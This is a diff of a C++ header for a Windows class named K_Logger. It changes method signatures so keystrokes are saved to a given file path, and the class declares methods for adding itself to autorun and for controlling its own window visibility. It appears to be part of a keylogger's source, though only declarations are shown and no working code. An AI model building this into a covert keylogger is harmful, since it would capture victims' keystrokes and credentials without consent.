@@ -17,8 +17,6 @@
 
 #include <iostream>
 #include <Windows.h>
-#include "os_paths/windows_os_paths.h"
-#include "os_paths/linux_os_paths.h"
 #include <fstream>
 #include <stdlib.h>
 #include <string>
@@ -28,6 +26,7 @@
 
 
 using std::fstream;
+using std::cin;
 using std::cout;
 using std::endl;
 using std::string;
@@ -36,11 +35,11 @@ using std::string;
 class K_Logger
 {
 public:
-	int SaveSymbol(WORD iKey);
+	int SaveSymbol(WORD iKey, const string filePath);
 	void AddToAutorun();
 
 private:
-	void WriteToDoc(const LPCSTR text, WindowsOSPath windows_path);
+	void WriteToDoc(LPCSTR text, const string filepath);
 
 protected:
 	void VisibilityApp();
